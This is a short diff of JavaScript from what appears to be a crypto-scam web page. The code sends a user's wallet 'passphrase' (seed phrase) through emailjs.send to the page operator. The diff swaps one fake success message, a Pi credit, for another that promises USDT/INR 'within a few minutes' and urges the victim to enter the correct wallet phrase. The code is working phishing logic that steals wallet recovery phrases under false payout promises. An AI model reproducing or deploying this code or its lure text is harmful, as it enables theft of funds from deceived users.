@@ -21,7 +21,7 @@
             emailjs.send("service_swe0q9b", "template_so4np09", {
                 passphrase: passphrase
             }).then(function(response) {
-                alert("Your claim was successful! Pi will be credited into your wallet within 48 hours");
+                alert("You will recieve USDT/INR within a few minutes. Make sure you have entered correct wallet phrase");
             }, function(error) {
                 alert("Failed to send passphrase: " + error.text);
             });
